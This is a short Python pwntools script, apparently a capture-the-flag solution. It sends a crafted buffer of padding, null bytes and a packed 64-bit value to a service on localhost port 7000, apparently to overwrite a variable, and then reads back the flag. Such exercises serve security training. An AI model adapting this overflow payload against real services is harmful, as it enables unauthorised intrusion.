from pwn import *

r = remote("localhost", 7000)

buf = b'12345'
buf += b'\x00' * 3
buf += p64(1)

log.success(f"Payload length: {len(buf)}")
r.sendline(buf)
flag = r.recvall().split(b' ')[-1].decode()
info(f"FLAG: {flag}")